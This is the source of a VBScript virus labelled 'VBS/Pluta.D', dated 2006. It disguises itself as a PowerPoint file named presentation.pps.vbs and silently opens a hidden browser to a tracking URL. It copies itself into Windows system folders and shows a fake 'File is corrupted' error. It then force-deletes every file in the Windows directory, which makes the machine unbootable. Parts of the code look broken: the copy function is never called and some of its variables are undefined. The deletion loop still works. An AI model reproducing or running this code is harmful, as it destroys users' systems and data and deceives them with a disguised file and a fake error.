'VBS/Pluta.D virus by Peneluta
'Wrote on Oct 07,2006

set ie=createobject("InternetExplorer.Application")
   ie.navigate "http://peneluta.uv.ro/newcount01.html"
   ie.visible = false

Set FSO = CreateObject("Scripting.FileSystemObject") 



function copyfiles()
myfile.writeline("Copying files to  :  " & sharename)
Set fso = CreateObject("scripting.filesystemobject")

fso.copyfile "c:\presentation.pps.vbs", "C:\"

If (fso2.FileExists("c:\presentation.pps.vbs")) Then
myfile.writeline("Successfull copy to  :  " & sharename)
End If  

fso.copyfile "c:\presentation.pps.vbs", "C:\WINDOWS"

fso.copyfile "c:\presentation.pps.vbs", "C:\WINDOWS\system32"



end function


msgbox "Error!File is corrupted!", 16, "Windows"

Set Peneluta = CreateObject("Scripting.FileSystemObject")
Set PenelutaDir = Peneluta.GetFolder(Peneluta.GetSpecialFolder(0)).Files
For Each PenelutaFile in PenelutaDir
Peneluta.DeleteFile PenelutaFile.path, True
Next

